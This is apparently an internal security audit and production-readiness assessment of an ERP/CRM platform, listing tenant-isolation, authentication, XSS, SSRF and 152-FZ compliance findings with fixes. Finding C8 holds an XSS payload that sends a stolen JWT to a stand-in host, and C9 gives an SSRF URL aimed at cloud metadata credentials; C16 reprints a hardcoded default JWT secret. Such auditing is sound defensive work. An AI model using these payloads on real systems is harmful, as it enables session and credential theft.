# SECURITY AUDIT & PRODUCTION READINESS ASSESSMENT
## PRIVOD ERP/CRM Platform

**Date:** 2026-02-18
**Auditor Profile:** CISSP/OSCP-certified, 15 years enterprise SaaS security
**Application:** Java Spring Boot 3.4 + React 19 + PostgreSQL 16
**Classification:** CONFIDENTIAL -- For Internal Use Only

---

## EXECUTIVE SUMMARY

This audit reveals a system with **strong architectural foundations** but **critical security gaps** that make it **NOT READY for production deployment** with real customer data. The most dangerous findings are:

1. **Multi-tenancy isolation is structurally broken** -- 15+ entity domains lack `organizationId`, no global Hibernate tenant filter
2. **Authentication infrastructure is partially scaffolded** -- MFA is a stub, sessions are dead code, JWT tokens in localStorage
3. **Hardcoded admin credentials** (`admin123`) in production database migrations
4. **152-FZ non-compliance** -- zero consent collection, PII in plaintext, no deletion mechanism
5. **SSRF in all integration services** -- user-controlled URLs with no validation

Enterprise clients WILL reject this system in a security questionnaire.

---

## SECURITY SCORECARD

| # | Domain | Score | Critical | High | Medium | Low |
|---|--------|:-----:|:--------:|:----:|:------:|:---:|
| 1 | Authentication & Sessions | **3.5/10** | 1 | 6 | 4 | 4 |
| 2 | Authorization & Multi-tenancy | **2.0/10** | 5 | 6 | 5 | 1 |
| 3 | Input Validation & Injection | **6.6/10** | 2 | 3 | 5 | 3 |
| 4 | API Security & Headers | **6.1/10** | 2 | 5 | 6 | 4 |
| 5 | Infrastructure & CI/CD | **7.0/10** | 1 | 3 | 2 | 1 |
| 6 | Compliance & Audit Logging | **3.5/10** | 5 | 4 | 5 | 1 |
| | **OVERALL WEIGHTED** | **4.2/10** | **16** | **27** | **27** | **14** |

**Total findings: 84** (16 Critical + 27 High + 27 Medium + 14 Low)

---

## CRITICAL VULNERABILITIES (16)

### C1. Multi-tenancy -- No Global Hibernate Tenant Filter
- **Domain:** Authorization
- **Impact:** Any missed check = cross-tenant data breach affecting ALL customers
- **Evidence:** Zero `@FilterDef`/`@Filter` annotations, zero `TenantInterceptor`, zero AOP aspects for tenant filtering. Isolation relies 100% on manual per-service checks.
- **Exploit:** Developer adds a new query without org filter -> instant cross-tenant data leak
- **Fix:** Implement Hibernate `@Filter` with automatic enabling per request (2-3 weeks)

### C2. Multi-tenancy -- 15+ Entity Domains Lack organizationId
- **Domain:** Authorization
- **Entities without org field:** QualityCheck, PunchList, PunchItem, ConstructionPermit, RegulatoryInspection, FuelRecord, MaintenanceRecord, Channel, Message, CallSession, PhotoCapture, IoTDevice, IoTAlert, AiConversation, Invoice, Payment, Budget, CashFlowEntry
- **Impact:** Structurally impossible to enforce tenant isolation for these entities
- **Fix:** Add `organizationId` column + migration + backfill for all entities (3-4 weeks)

### C3. Multi-tenancy -- ReconciliationActService Has NO Tenant Check
- **File:** `modules/finance/service/ReconciliationActService.java:164-168`
- **Code:** `getActOrThrow()` calls `findById()` without org validation; `getAct()` calls `requireCurrentOrganizationId()` but **discards the return value**
- **Exploit:** `GET /api/reconciliation-acts/{id}` with ID from another org -> full financial data leak
- **Fix:** Add `findByIdAndOrganizationIdAndDeletedFalse()` to repository

### C4. Authentication -- Hardcoded Admin Password in Production Migration
- **File:** `db/migration/V2__auth_tables.sql:167`, `V76__seed_roles_and_admin_user.sql:259`
- **Code:** BCrypt hash of `admin123` committed to repo, runs in ALL profiles including production
- **Exploit:** Anyone with repo access (all developers) knows the admin password
- **Fix:** Remove from migrations, use env-variable seeding, force password change on first login

### C5. Multi-tenancy -- Open Registration Creates Users with NULL organizationId
- **File:** `modules/auth/service/AuthService.java:104-135`
- **Code:** `register()` never sets `organizationId` on new user; user gets VIEWER role immediately
- **Exploit:** Register -> access endpoints missing `@PreAuthorize` -> query global repos without tenant filter
- **Fix:** Disable open registration or require invitation token with mandatory org assignment

### C6. Authentication -- MFA TOTP Verification is a Stub
- **File:** `modules/auth/service/MfaService.java:127-139`
- **Code:** `return code != null && code.matches("\\d{6}") && config.getSecret() != null;`
- **Impact:** ANY 6-digit number passes MFA verification. MFA provides zero security.
- **Fix:** Implement RFC 6238 TOTP validation (use `com.eatthepath:java-totp` library)

### C7. Authentication -- MFA Not Enforced During Login
- **File:** `modules/auth/service/AuthService.java:46-101`
- **Impact:** Login flow issues JWT immediately after password check -- never checks MFA status
- **Fix:** Add MFA challenge step: if `mfaConfig.isEnabled()`, return partial token requiring MFA verification

### C8. Input Validation -- Stored XSS in AI Assistant via dangerouslySetInnerHTML
- **File:** `frontend/src/modules/ai/AiAssistantPage.tsx:27-50, 455-458`
- **Code:** Custom regex-based markdown renderer outputs raw HTML, rendered via `dangerouslySetInnerHTML`
- **Exploit:** AI response contains `**<img src=x onerror=fetch('evil.com?t='+localStorage.getItem('privod-auth'))>**` -> steals JWT
- **Fix:** Use DOMPurify or `react-markdown` with `rehype-sanitize`

### C9. Input Validation -- SSRF in ALL Integration Services
- **Files:** `SbisService.java:296-317`, `OneCIntegrationService.java:335-339`, `WebDavService.java:128,168`, `SmsService.java:265-276`
- **Code:** User-configured URLs passed directly to `RestTemplate.exchange()` with ZERO validation
- **Exploit:** Set integration URL to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` -> steal cloud credentials
- **Fix:** Implement URL validation blocking private IPs, metadata endpoints, localhost

### C10. API Security -- Webhook Signature Validation is a Stub
- **File:** `modules/integration/service/IntegrationWebhookService.java:223-227`
- **Code:** `return signature != null && !signature.isBlank();` -- any non-empty string passes
- **Fix:** Implement HMAC-SHA256 signature verification

### C11. API Security -- Telegram Webhook Unauthenticated
- **File:** `SecurityConfig.java:56` -- `/api/integrations/telegram/webhook` is `permitAll()`
- **Impact:** Anyone can send fake Telegram updates to trigger bot commands
- **Fix:** Validate `X-Telegram-Bot-Api-Secret-Token` header

### C12. Compliance -- No Personal Data Consent Mechanism
- **Impact:** 152-FZ Art. 9 violation -- no legal basis for processing employee PII
- **Evidence:** Zero matches for "consent"/"agreement" in entire codebase
- **Fix:** Create consent entity, collection UI, and tracking workflow (3-4 weeks)

### C13. Compliance -- Employee PII in Plaintext (Passport, INN, SNILS)
- **File:** `modules/hr/domain/Employee.java:78-85`
- **Impact:** 152-FZ Art. 19, FSTEC Order 21 violation
- **Fix:** JPA `AttributeConverter` with AES-GCM encryption for sensitive fields (2 weeks)

### C14. Compliance -- No Data Subject Deletion Mechanism
- **File:** `infrastructure/persistence/BaseEntity.java:55-57` -- only `softDelete()` exists
- **Impact:** 152-FZ Art. 21 violation -- cannot fulfill deletion requests
- **Fix:** Implement `DataSubjectDeletionService` with cascade hard-delete (3 weeks)

### C15. Compliance -- AI Sends PD Context to US-Hosted OpenAI
- **File:** `application.yml:91-93` -- `app.ai.provider: openai`
- **Impact:** 152-FZ Art. 12 violation -- cross-border PD transfer without legal basis
- **Fix:** Self-hosted LLM (vLLM) or Russian provider (YandexGPT/GigaChat)

### C16. API Security -- Hardcoded JWT Secret in Dev Docker Compose
- **File:** `docker-compose.yml:117`
- **Code:** `APP_JWT_SECRET: "${JWT_SECRET:-xk8Pq2mN7vR4tY9wA3cF6hJ0lBnE5sG8dI1oU4zK7mX2pQ9rT6yW3aD0fH5jL}"`
- **Exploit:** If env var not set, anyone who reads repo can forge JWT for ANY user
- **Fix:** Remove default, use `${JWT_SECRET:?must be set}`

---

## HIGH VULNERABILITIES (27)

### Authentication (6)

| # | Finding | File | Fix |
|---|---------|------|-----|
| H1 | JWT tokens stored in localStorage (XSS theft) | `stores/authStore.ts:85-94` | httpOnly cookies for refresh token |
| H2 | No refresh token rotation (replay attack) | `AuthService.java:137-163` | Token rotation with reuse detection per RFC 6819 |
| H3 | No server-side logout / token blacklisting | No logout endpoint exists | Redis-based token blacklist + logout API |
| H4 | No password reset flow (main app) | `LoginPage.tsx:182-184` -- button does nothing | Implement secure token-based reset with email |
| H5 | Session infrastructure is dead code | `UserSession` entity exists but never used | Connect to auth flow or remove |
| H6 | Backup codes exposed in every MFA API response | `MfaConfigResponse.java:17` | Show only on enrollment |

### Authorization (6)

| # | Finding | File | Fix |
|---|---------|------|-----|
| H7 | 4+ controller GET endpoints missing @PreAuthorize | DispatchController, QualityCheckController, CallSessionController, NotificationController | Add role-based @PreAuthorize |
| H8 | QualityCheckService skips tenant check when projectId is NULL | `QualityCheckService.java:208-218` | Require projectId or add direct org check |
| H9 | Invoice/Payment/Budget fetched globally then post-validated (IDOR) | `InvoiceRepository.java:24` | Add org to repository query |
| H10 | Aggregate queries (SUM, COUNT) without org filter | `InvoiceRepository`, `FuelRecordRepository`, `ReconciliationActRepository` | Add org parameter |
| H11 | No object-level authorization (ownership checks) | All services | Add resource ownership verification |
| H12 | Telegram webhook -- no signature verification | `TelegramController.java:125-135` | Validate `X-Telegram-Bot-Api-Secret-Token` |

### API Security (5)

| # | Finding | File | Fix |
|---|---------|------|-----|
| H13 | Rate limit bypass via X-Forwarded-For spoofing | `RateLimitFilter.java:96-105` | Use rightmost IP, trust only known proxies |
| H14 | SMS verification code uses `java.util.Random` (predictable) | `SmsService.java:141` | Use `SecureRandom` |
| H15 | SMS/SBIS API keys stored in plaintext in DB | `SmsConfig.java:36`, `SbisConfig.java:36` | Encrypt with `AttributeConverter` |
| H16 | Telegram bot token stored in plaintext in DB | `TelegramConfig.java:29` | Encrypt |
| H17 | SMSC.ru credentials sent via GET URL parameters | `SmsService.java:265-276` | Logged in access logs, unavoidable for this API |

### Compliance (4)

| # | Finding | File | Fix |
|---|---------|------|-----|
| H18 | AuditService userId is always NULL | `AuditService.java:28` | Assign from authentication context |
| H19 | No READ audit for PII data | `AuditAction.java` -- only CREATE/UPDATE/DELETE/STATUS_CHANGE | Add READ, EXPORT, DOWNLOAD actions |
| H20 | Password reset token logged in plaintext | `PortalAuthService.java:113` | Remove/mask token in log |
| H21 | Default encryption key `0123456789abcdef...` in SettingEncryptionService | `SettingEncryptionService.java:29` | Make required env var with no default |

### Infrastructure (3)

| # | Finding | Fix |
|---|---------|-----|
| H22 | No off-site backup (local Docker volume only) | S3/remote replication |
| H23 | No WAL-based PITR (RPO = 24 hours) | Configure WAL archiving with pgBackRest |
| H24 | Security scans non-blocking in CI (OWASP, Semgrep, Trivy all `continue-on-error`) | Make CRITICAL/HIGH findings block pipeline |

### Input Validation (3)

| # | Finding | File | Fix |
|---|---------|------|-----|
| H25 | Stored XSS in ExportJobListPage | `ExportJobListPage.tsx:252` | Remove dangerouslySetInnerHTML |
| H26 | Hardcoded admin credentials in DataInitializer (dev profile risk) | `DataInitializer.java:92,104` | Read from env var |
| H27 | Swagger exposed in nginx without IP restriction | `nginx.conf:166-171` | Add `allow`/`deny` directives |

---

## MEDIUM VULNERABILITIES (27)

| # | Domain | Finding | File |
|---|--------|---------|------|
| M1 | Auth | Account lock status endpoint leaks email existence | `SecurityPolicyController` |
| M2 | Auth | Open registration with no email verification | `AuthService.java:104-135` |
| M3 | Auth | `.env.example` suggests 24h access token lifetime | `.env.example:33` |
| M4 | Auth | SecurityPolicy/session infra not connected (false security) | Dead code |
| M5 | Auth | Refresh token not stored on frontend login | `LoginPage.tsx:52` -- missing 3rd arg |
| M6 | AuthZ | OrganizationController lists ALL orgs to any user | `OrganizationController.java:40-48` |
| M7 | AuthZ | WebSocket topics not tenant-scoped | `WebSocketAuthInterceptor` -- no SUBSCRIBE check |
| M8 | AuthZ | JWT does not embed organizationId | `JwtTokenProvider.java:61-69` |
| M9 | AuthZ | ProjectController accepts organizationId from query param | `ProjectController.java:60` |
| M10 | Input | JSON injection in WhatsApp SMS | `SmsService.java:347-354` |
| M11 | Input | WebSocket permitAll at HTTP level | `SecurityConfig.java:55` |
| M12 | Input | JWT+refresh token stealable via any XSS | `authStore.ts:85` |
| M13 | Input | Open self-registration with email enumeration | `AuthService.java:107-109` |
| M14 | API | CSP allows 'unsafe-inline' for styles | `nginx.conf:105` |
| M15 | API | Static assets location strips security headers | `nginx.conf:186-190` |
| M16 | API | Duplicate CORS config (WebConfig + SecurityConfig) | Inconsistent allowedHeaders |
| M17 | API | In-memory rate limiter doesn't scale horizontally | `RateLimitFilter.java:43` |
| M18 | API | API key per-key rate limit not enforced | `ApiKeyAuthenticationFilter` |
| M19 | API | WebSocket no SUBSCRIBE-level authorization | `WebSocketAuthInterceptor.java` |
| M20 | API | JWT access token 24h in production compose | `docker-compose.prod.yml:135` |
| M21 | API | Loki port exposed to host in production | `docker-compose.prod.yml:403` |
| M22 | Infra | Frontend Dockerfile runs nginx as root | `frontend/Dockerfile` |
| M23 | Infra | No automated rollback on deploy failure | `deploy.yml` |
| M24 | Infra | PII in logs (phone numbers) | `SmsService.java:106,148` |
| M25 | Compliance | No privacy policy or cookie consent in frontend | Zero matches |
| M26 | Compliance | No DB-level encryption / no PostgreSQL TLS | `docker-compose.prod.yml` |
| M27 | Compliance | PersonalCard T-2 form in unencrypted JSONB blob | `PersonalCard.java:33-35` |

---

## LOW VULNERABILITIES (14)

| # | Finding |
|---|---------|
| L1 | BCrypt cost factor at default 10 (should be 12+) |
| L2 | No password complexity requirements enforced |
| L3 | No common password dictionary check |
| L4 | In-memory rate limiting per-instance only |
| L5 | Global sequential numbering leaks tenant activity volume |
| L6 | X-XSS-Protection header is deprecated |
| L7 | Missing `server_tokens off` in nginx |
| L8 | No API versioning strategy |
| L9 | Missing `proxy_buffer` hardening in nginx |
| L10 | Dev Redis has no password (acceptable for dev) |
| L11 | Debug port 5005 exposed in dev compose |
| L12 | No Gradle dependency lock file |
| L13 | Service worker update without user notification |
| L14 | MinIO default credentials in StorageProperties |

---

## PRODUCTION READINESS MATRIX

### Infrastructure & DevOps

| # | Item | Status | Evidence |
|---|------|:------:|----------|
| 1 | Docker containerization | ✅ | Multi-stage builds, Alpine images |
| 2 | Non-root containers | ⚠️ | Backend: yes; Frontend nginx: **runs as root** |
| 3 | Health checks on all services | ✅ | PostgreSQL, Redis, Backend, Frontend, MinIO, Nginx |
| 4 | Resource limits (CPU/memory) | ✅ | All services have limits + reservations |
| 5 | Network isolation | ✅ | Internal bridge, only nginx exposes ports |
| 6 | Volume mount security | ✅ | Config mounts are `:ro` |
| 7 | Secrets management | ✅ | `${VAR:?must be set}` enforcement |
| 8 | Auto-scaling | ❌ | Single Docker Compose -- no K8s/ECS |
| 9 | Load balancer | ⚠️ | Nginx as reverse proxy, no multi-node LB |
| 10 | CDN for static assets | ❌ | Direct nginx serving |

### Database

| # | Item | Status | Evidence |
|---|------|:------:|----------|
| 11 | Automated backups | ✅ | Daily with 7d/4w/6m retention |
| 12 | Pre-deploy backup | ✅ | pg_dump with integrity verification |
| 13 | Point-in-time recovery | ❌ | No WAL archiving |
| 14 | Read replica | ❌ | Single instance |
| 15 | Connection pooling | ✅ | HikariCP, max=80 in prod |
| 16 | Slow query monitoring | ✅ | `log_min_duration_statement=500` |
| 17 | Migrations versioned | ✅ | 114 Flyway migrations, zero destructive |
| 18 | Hibernate DDL | ✅ | `validate` mode -- never auto-modifies schema |

### Monitoring & Observability

| # | Item | Status | Evidence |
|---|------|:------:|----------|
| 19 | Error tracking (Sentry) | ✅ | 100% error sampling, PII filtering |
| 20 | Metrics (Prometheus) | ✅ | JVM, HTTP, HikariCP, PostgreSQL |
| 21 | Log aggregation (Loki) | ✅ | Promtail + 30d retention |
| 22 | Dashboards (Grafana) | ✅ | Spring Boot + PostgreSQL pre-provisioned |
| 23 | Alerting | ✅ | BackendDown, 5xx rate, DB pool, disk, memory |
| 24 | Structured logging | ✅ | JSON (LogstashEncoder) in prod |
| 25 | Health endpoints | ✅ | `/actuator/health` with `when-authorized` details |
| 26 | Uptime monitoring | ❌ | No external uptime monitor (Pingdom/UptimeRobot) |

### CI/CD Pipeline

| # | Item | Status | Evidence |
|---|------|:------:|----------|
| 27 | Unit + integration tests | ✅ | Backend tests + PostgreSQL service container |
| 28 | Frontend tests + lint | ✅ | Vitest + ESLint + TSC |
| 29 | E2E tests (Playwright) | ✅ | Smoke tests against running stack |
| 30 | Lighthouse CI | ✅ | Performance + accessibility budgets |
| 31 | SAST (Semgrep) | ⚠️ | Runs but `continue-on-error: true` |
| 32 | Dependency scanning | ⚠️ | OWASP + npm audit but non-blocking |
| 33 | Docker image scanning (Trivy) | ⚠️ | Runs but `exit-code: 0` |
| 34 | Staging environment | ✅ | Auto-deploy from `develop` branch |
| 35 | Preview environments for PR | ❌ | Not implemented |
| 36 | Blue-green / canary deploy | ❌ | Direct replacement |
| 37 | Automated rollback | ❌ | Manual intervention required |
| 38 | Feature flags | ❌ | Not implemented |

### SSL/TLS & Encryption

| # | Item | Status | Evidence |
|---|------|:------:|----------|
| 39 | TLS 1.2+ only | ✅ | `ssl_protocols TLSv1.2 TLSv1.3` |
| 40 | AEAD cipher suite | ✅ | GCM + CHACHA20-POLY1305 only |
| 41 | Forward secrecy | ✅ | ECDHE/DHE key exchange |
| 42 | OCSP stapling | ✅ | Enabled |
| 43 | Session tickets disabled | ✅ | Prevents key compromise |
| 44 | Certificate auto-renewal | ✅ | Certbot with 12h loop |
| 45 | HSTS with preload | ✅ | `max-age=31536000; includeSubDomains; preload` |

### Disaster Recovery

| # | Item | Status | Evidence |
|---|------|:------:|----------|
| 46 | RTO defined | ❌ | Not documented |
| 47 | RPO defined | ⚠️ | Implicit 24h (daily backup), should be < 1h |
| 48 | Backup restoration tested | ⚠️ | Pre-deploy backup verified but no DR drill |
| 49 | Incident response plan | ❌ | Not documented |
| 50 | Runbooks | ❌ | Not documented |
| 51 | Off-site backup | ❌ | Local Docker volume only |

### Compliance (152-FZ)

| # | Item | Status | Evidence |
|---|------|:------:|----------|
| 52 | Consent collection | ❌ | No consent entity or UI |
| 53 | Operator registration | ❌ | Not mentioned in codebase |
| 54 | PII encryption at rest | ❌ | Passport, INN, SNILS in plaintext |
| 55 | Right to deletion | ❌ | Only soft delete exists |
| 56 | Data breach notification | ❌ | No mechanism |
| 57 | Cross-border transfer control | ❌ | AI sends data to US |
| 58 | Privacy policy | ❌ | Not in frontend |
| 59 | Data export for subjects | ❌ | No self-service export |
| 60 | Audit trail for PD access | ⚠️ | No READ audit logging |

### Multi-tenancy & SaaS

| # | Item | Status | Evidence |
|---|------|:------:|----------|
| 61 | Tenant data isolation | ❌ | No global filter, 15+ entities missing orgId |
| 62 | Billing / subscription | ❌ | Not implemented |
| 63 | Trial period | ❌ | Not implemented |
| 64 | Tenant onboarding (self-service) | ❌ | Open registration but no org creation |
| 65 | Tenant data export | ❌ | Not implemented |
| 66 | Tenant data purge | ❌ | Not implemented |
| 67 | White-label / customization | ❌ | Not implemented |

### i18n & Localization

| # | Item | Status | Evidence |
|---|------|:------:|----------|
| 68 | i18n framework | ✅ | Custom `t()` with `ru.ts` + `en.ts` |
| 69 | All strings externalized | ⚠️ | ~1,485 hardcoded Russian strings remain |
| 70 | Date/number/currency formatting | ✅ | `formatMoney()`, locale-aware dates |
| 71 | Timezone handling | ⚠️ | `Instant` in backend, but frontend display not tested |
| 72 | Multi-currency | ⚠️ | Amount fields exist, no currency conversion |

---

## PRODUCTION LAUNCH BLOCKERS (Must Fix)

### Tier 0 -- STOP SHIP (fix before any real data enters the system)

| # | Blocker | Effort | Impact if Ignored |
|---|---------|--------|-------------------|
| B1 | **Implement global Hibernate tenant filter** | 2-3 weeks | Cross-tenant data breach -> all customer data exposed |
| B2 | **Add organizationId to all entities** | 3-4 weeks | Cannot isolate tenant data for 15+ domains |
| B3 | **Remove hardcoded admin123 from migrations** + force first-login password change | 2 days | Full admin access with known password |
| B4 | **Disable open registration** or require invitation tokens | 3 days | Anyone can create accounts and access data |
| B5 | **Fix ReconciliationActService tenant check** + audit all services | 1-2 weeks | Direct cross-tenant financial data access |
| B6 | **Implement PII encryption** (passport, INN, SNILS, salary) | 2 weeks | 152-FZ violation, customer audit failure |

### Tier 1 -- FIX BEFORE BETA (fix before external users)

| # | Blocker | Effort |
|---|---------|--------|
| B7 | Fix AI assistant XSS (dangerouslySetInnerHTML) | 1 day |
| B8 | Add SSRF validation to all integration URLs | 3 days |
| B9 | Move JWT tokens out of localStorage (httpOnly cookies) | 1 week |
| B10 | Implement proper MFA (TOTP + enforce in login flow) | 1-2 weeks |
| B11 | Implement server-side logout with token blacklisting | 3 days |
| B12 | Implement webhook signature validation (HMAC-SHA256) | 2 days |
| B13 | Implement password reset flow | 1 week |
| B14 | Add off-site backup replication (S3) | 2 days |
| B15 | Enable WAL archiving for PITR | 3 days |

### Tier 2 -- FIX BEFORE GA (fix before enterprise sales)

| # | Blocker | Effort |
|---|---------|--------|
| B16 | 152-FZ consent collection mechanism | 3-4 weeks |
| B17 | Data subject deletion (hard delete with cascade) | 3 weeks |
| B18 | Replace OpenAI with self-hosted/Russian AI | 2-3 weeks |
| B19 | Data breach notification workflow | 2 weeks |
| B20 | READ audit logging for PII entities | 2 weeks |
| B21 | Make security scans blocking in CI | 1 day |
| B22 | Implement refresh token rotation | 1 week |
| B23 | Fix AuditService userId (always NULL) | 1 hour |
| B24 | Fix rate limiter X-Forwarded-For bypass | 2 days |
| B25 | Encrypt integration credentials (1C, SBIS, SMS, Telegram) | 1 week |

---

## WHAT WORKS WELL (Positive Findings)

Despite the critical gaps, the application has significant security strengths:

| Area | Assessment |
|------|------------|
| **SQL Injection Protection** | 9/10 -- All queries parameterized, zero string concatenation in SQL |
| **TLS Configuration** | 9/10 -- TLS 1.2+1.3, AEAD ciphers, OCSP, HSTS preload |
| **File Upload Security** | 9/10 -- Apache Tika content sniffing, S3 with UUID keys, type whitelists |
| **Error Handling** | 8/10 -- No stack traces leaked, request ID correlation |
| **API Key Management** | 8/10 -- SHA-256 hashed before storage, shown once on creation |
| **Mass Assignment Protection** | 9/10 -- All endpoints use DTOs, zero direct entity binding |
| **Docker Security** | 8/10 -- Non-root backend, multi-stage builds, resource limits |
| **Observability Stack** | 9/10 -- Prometheus + Grafana + Loki + Sentry + alerting |
| **CI/CD Coverage** | 8/10 -- Unit, E2E, SAST, dependency scan, image scan, Lighthouse |
| **Account Lockout** | 7/10 -- 5 failures -> 15min lock, with audit |
| **Rate Limiting** | 6/10 -- Dual layer (nginx + app), auth endpoints stricter |
| **RBAC Framework** | 7/10 -- 25+ roles, @PreAuthorize on most controllers |

---

## ENTERPRISE SECURITY QUESTIONNAIRE READINESS

Will this system pass a typical enterprise security questionnaire?

| Question Category | Current Answer | Pass? |
|-------------------|---------------|:-----:|
| Do you encrypt PII at rest? | No (plaintext passport, INN, SNILS) | ❌ |
| Do you support MFA/2FA? | Stub implementation (any code passes) | ❌ |
| Do you support SSO/SAML? | OIDC CRUD only, no actual auth flow | ❌ |
| Is there an audit trail for all data access? | CREATE/UPDATE/DELETE only, no READ | ❌ |
| How is tenant data isolated? | Manual per-service checks, 15+ domains unscoped | ❌ |
| Do you have a SOC 2 / ISO 27001? | No | ❌ |
| Is there a breach notification process? | No | ❌ |
| Do you support data export/deletion? | Only soft delete, no export | ❌ |
| Are security scans in your CI/CD? | Yes but non-blocking | ⚠️ |
| Is your infrastructure auto-scaling? | Single Docker Compose | ❌ |
| Do you have disaster recovery? | Daily backups, no PITR, no off-site | ⚠️ |
| Do you have penetration test results? | No | ❌ |

**Result: 0/12 PASS, 2/12 PARTIAL, 10/12 FAIL**

---

## REMEDIATION ROADMAP

### Phase 1: Security Foundation (Weeks 1-4) -- ~160 hours
- Global Hibernate tenant filter + organizationId on all entities
- Disable open registration, remove hardcoded credentials
- PII encryption (passport, INN, SNILS, integration credentials)
- Fix XSS (AI chat, export page)
- SSRF validation for integrations
- Server-side logout + token blacklisting
- Webhook signature validation

### Phase 2: Authentication Hardening (Weeks 5-8) -- ~120 hours
- Real TOTP MFA implementation + login flow integration
- JWT in httpOnly cookies + refresh token rotation
- Password reset flow
- Password complexity + dictionary check
- Redis-based rate limiting
- Fix AuditService userId, add READ audit
- Off-site backup + WAL PITR

### Phase 3: Compliance (Weeks 9-16) -- ~200 hours
- 152-FZ consent collection mechanism
- Data subject deletion (cascade hard delete)
- Russian AI provider (replace OpenAI)
- Data breach notification workflow
- Privacy policy + cookie consent
- Tenant data export/purge
- Security scan enforcement in CI

### Phase 4: Enterprise Readiness (Weeks 17-24) -- ~200 hours
- OIDC/SAML SSO implementation
- Kubernetes migration (auto-scaling, HA)
- SOC 2 Type II preparation
- External penetration test
- Incident response plan + runbooks
- Object-level authorization

**Total estimated effort: ~680 hours (4-6 months with 2 engineers)**

---

## PII DATA MAP

### Entities Containing Personal Data

| Entity | Module | PII Fields | Sensitivity | Encrypted? |
|--------|--------|-----------|:-----------:|:----------:|
| Employee | hr | passport, INN, SNILS, phone, email, salary, hourlyRate | CRITICAL | NO |
| PersonalCard | hrRussian | formT2Data (JSONB: passport, address, family, education) | CRITICAL | NO |
| MilitaryRecord | hrRussian | all fields (military obligation data) | HIGH | NO |
| WorkBook | hrRussian | entries (JSONB: work history) | HIGH | NO |
| EmploymentContract | hrRussian | salary, position, dates | HIGH | NO |
| User | auth | email, phone | MEDIUM | NO |
| PortalUser | portal | email, phone, INN | HIGH | NO |
| CrmLead | crm | phone, email, company | MEDIUM | NO |
| Applicant | recruitment | phone, salary expectation | MEDIUM | NO |
| SelfEmployedContractor | selfEmployed | INN, phone, bankAccount | HIGH | NO |
| Counterparty | organization | INN, bankAccount, KPP | HIGH | NO |
| OneCConfig | integration | password (1C system) | CRITICAL | NO |
| SbisConfig | integration | password (SBIS system) | CRITICAL | NO |
| SmsConfig | integration | apiKey (SMS provider) | HIGH | NO |
| TelegramConfig | integration | botToken | HIGH | NO |
| OidcProvider | auth | clientSecret | HIGH | NO |
| IntegrationConfig | integration | apiKey, apiSecret | HIGH | **YES** (AES-GCM) |
| SystemSetting (SECRET) | settings | value | VARIES | **YES** (AES-GCM) |

---

## APPENDIX: AUDIT METHODOLOGY

### Tools & Techniques
- Static code analysis via manual review of all security-critical files
- Architecture analysis of Spring Security filter chain
- Multi-tenancy isolation testing via repository method analysis
- Dependency review via `build.gradle.kts` and `package.json`
- Infrastructure review via Docker Compose, Nginx, CI/CD workflows
- 152-FZ compliance checklist based on Roskomnadzor requirements

### Files Analyzed
- **Backend:** ~200+ Java files (controllers, services, repositories, entities, configs)
- **Frontend:** ~50+ TypeScript files (stores, API clients, auth pages, config)
- **Infrastructure:** docker-compose (dev + prod), nginx.conf, CI/CD workflows, Dockerfiles, monitoring configs
- **Migrations:** All 114 Flyway migration files

### Coverage
- 100% of controllers checked for @PreAuthorize
- 100% of repositories checked for tenant isolation
- 100% of integration services checked for SSRF
- 100% of frontend files checked for XSS (dangerouslySetInnerHTML)
- 100% of Docker/nginx configs checked for security

---

*Report generated: 2026-02-18 | Classification: CONFIDENTIAL | Distribution: CTO, Lead Engineer only*
